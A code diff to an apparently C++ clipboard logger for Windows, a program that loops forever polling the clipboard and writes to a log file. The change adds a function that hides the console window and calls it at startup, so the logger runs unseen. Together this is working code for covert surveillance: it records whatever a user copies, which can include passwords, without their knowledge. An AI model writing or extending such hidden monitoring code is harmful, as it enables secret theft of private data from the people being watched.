@@ -8,8 +8,18 @@ using namespace std;
 //create a stream to a file stored in the Logbook object
 string Logbook = "Log1.txt";
 ofstream Recorder(Logbook);
+//if visibility is set to 1 then it will not run in the background, if it was 0 then the program runs in the background
+void Run_in_Background(int visibility) {
+	HWND window;
+	//https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-findwindowa
+	window = FindWindowA("ConsoleWindowClass", NULL);
+	//https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
+	ShowWindow(window, visibility);
+}
 
 int main() {
+	//run it in the background
+	Run_in_Background(0);
 	DWORD tOurSeq = -1;//our current count
 		while (1) {//continuously run
 			// get the clipboard count
